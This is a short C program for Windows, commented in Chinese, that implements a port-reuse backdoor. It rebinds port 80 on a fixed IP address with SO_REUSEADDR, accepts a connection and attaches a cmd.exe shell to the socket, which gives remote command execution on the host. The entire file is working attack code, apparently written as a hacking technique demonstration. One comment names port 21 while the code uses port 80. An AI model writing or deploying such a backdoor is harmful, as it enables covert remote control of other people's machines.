// 端口重用

#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
int main()
{
    WSADATA ws;
    SOCKET listenFD;
    int ret;
    //初始化wsa
    WSAStartup(MAKEWORD(2, 2), &ws);
    //注意要用WSASocket
    listenFD = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    //设置套接字选项，SO_REUSEADDR选项就是可以实现端口重绑定的
    //但如果指定了SO_EXCLUSIVEADDRUSE，就不会绑定成功
    BOOL  val = TRUE;
    setsockopt(listenFD, SOL_SOCKET, SO_REUSEADDR, (char *)&val, sizeof(val) );
    //监听本机21端口
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(80);
    server.sin_addr.s_addr = inet_addr("12.1.40.217");
    ret = bind(listenFD, (sockaddr *)&server, sizeof(server));
    ret = listen(listenFD, 2);
    //如果客户请求80端口，接受连接
    int iAddrSize = sizeof(server);
    SOCKET clientFD = accept(listenFD, (sockaddr *)&server, &iAddrSize);
    STARTUPINFO si;
    ZeroMemory(&si, sizeof(si));
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
    //设置为输入输出句柄为Socket
    si.hStdInput = si.hStdOutput = si.hStdError = (void *)clientFD;
    char cmdLine[] = "cmd";
    PROCESS_INFORMATION ProcessInformation;
    //建立进程
    ret = CreateProcess(NULL, cmdLine, NULL, NULL, 1, 0, NULL, NULL, &si, &ProcessInformation);
    return 0;
}
